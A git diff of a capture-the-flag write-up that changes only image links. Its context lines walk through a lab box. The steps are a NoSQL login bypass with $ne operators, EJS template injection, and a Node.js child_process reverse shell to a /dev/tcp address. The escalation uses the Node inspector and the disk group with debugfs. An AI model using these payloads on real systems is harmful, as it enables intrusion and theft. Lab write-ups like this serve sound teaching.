@@ -28,7 +28,7 @@ gobuster dir -u http://10.67.167.129 \
   -o gobuster_http.txt
 ```
 
-![[images/1.png]]
+![](../Images/1.png)
 
 The scan revealed two interesting endpoints:
 
@@ -40,7 +40,7 @@ The `/staff` endpoint stood out as restricted to authenticated users.
 ### Step 2: Configure Burp Suite
 
 Before intercepting any requests, I configured my browser to send traffic through **Burp Suite**.
-![[2.png]]
+![](../Images/2.png)
 
 Once Burp is enabled, I ensured that **Intercept** is turned **On** in Burp Suite (I am listing this in the step because I spent 20 minutes trying to figure out why Burp Suite wasn't intercepting messages 🙃). All browser requests will now pass through Burp, allowing me to inspect and modify them before they reach the server.
 
@@ -53,10 +53,10 @@ Replaced the original username and password parameters with:
 ```
 username[$ne]=1&password[$ne]=1
 ```
-![[3.png]]
+![](../Images/3.png)
 
 The `$ne` operator is a MongoDB query operator that means **"not equal."** Instead of checking whether the supplied credentials match an existing account, the backend accepts any document whose username and password are **not equal to** `1`, effectively bypassing authentication.
-![[4.png]]
+![](../Images/4.png)
 
 The important part is the `connect.sid` cookie. It represents an authenticated session that will be used when accessing the staff area.
 
@@ -65,7 +65,7 @@ Click **Forward** once more to allow the request to continue.
 After that, switch **Intercept** to **Off** and return to your browser.
 
 And going back to your browser, you now have permission to sit back in your chair for 10 seconds and take in your first win.
-![[5.png]]
+![](../Images/5.png)
 
 ### Step 4: Confirm Server-Side Template Injection
 
@@ -78,7 +78,7 @@ Replace the template with:
 ```
 <%= 7*7 %>
 ```
-![[6.png]]
+![](../Images/6.png)
 
 the expression has been evaluated by the server, confirming a **Server-Side Template Injection (SSTI)** vulnerability.
 
@@ -86,13 +86,13 @@ the expression has been evaluated by the server, confirming a **Server-Side Temp
 
 Since EJS executes JavaScript on the server, I accessed Node.js modules and execute operating system commands.
 
-![[7.png]]
+![](../Images/7.png)
 
 ### Step 6: Get User flag!
 
 Now replace the template with the command from the screenshot above and voilà you have got the first flag. Now you can celebrate your second win.
 
-![[8.png]]
+![](../Images/8.png)
 
 ---
 
@@ -106,7 +106,7 @@ I set up a listener:
 nc -lvnp 4444
 ```
 
-![[9.png]]
+![](../Images/9.png)
 
 Now getting back the browser and I pasted a reverse shell payload:
 
@@ -115,15 +115,15 @@ const cp = global.process.mainModule.require('child_process');
 cp.spawn('/bin/bash', ['-c', 'bash -i >& /dev/tcp/10.67.66.192/4444 0>&1'], {detached: true, stdio: 'ignore'}).unref();
 ```
 
-![[10.png]]
+![](../Images/10.png)
 
+![](../Images/11.png)
 
-![[11.png]]
 ## Privilege Escalation
 
 After running the command above we get a beautiful shell! Landed as the `poolside` user.
 
-![[12.png]]
+![](../Images/12.png)
 
 ### Step 1: Enumerate a local system
 
@@ -135,7 +135,7 @@ One of the first commands I ran was:
 ss -ltnu
 ```
 
-![[13.png]]
+![](../Images/13.png)
 
 This displays all listening TCP and UDP sockets. Services bound only to the loopback interface (`127.0.0.1`) are inaccessible from the network, so they are often overlooked during external reconnaissance. However, once an attacker has local access, these internal services become reachable and may expose additional attack paths.
 
@@ -151,7 +151,7 @@ To investigate the service listening on port **9229**, I had to connect to the N
 node inspect 127.0.0.1:9229
 ```
 
-![[14.png]]
+![](../Images/14.png)
 
 Once connected, I switched to the **REPL** (Read-Eval-Print Loop). The REPL provides an interactive JavaScript console, allowing you to evaluate JavaScript expressions within the context of the running Node.js process.
 
@@ -162,7 +162,7 @@ process.getuid()
 process.getgid()
 ```
 
-![[15.png]]
+![](../Images/15.png)
 
 Running these commands confirms that the debugger is attached to a different process than our current shell. Since the Node.js service is running under another account, interacting with it through the debugger provides access to the execution context and permissions of that service rather than those of the `poolside` user.
 
@@ -174,9 +174,9 @@ I also noticed a group "disk" there. Members of the `disk` group are often allow
 - `/dev/sda1`
 - `/dev/nvme0n1`
 - `/dev/nvme0n1p1`
-![[17.png]]
+![](../Images/17.png)
 
-![[16.png]]
+![](../Images/16.png)
 
 The `id` command shows that the Node.js process runs as `pipelinesvc` and belongs to the `disk` group. On many Linux systems, members of this group can directly access raw block devices, making it possible to inspect the underlying filesystem.
 
@@ -192,7 +192,7 @@ process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R
 
 The result is in the picture!
 
-![[18.png]]
+![](../Images/18.png)
 
 Good Job Fellow Hackers.
 
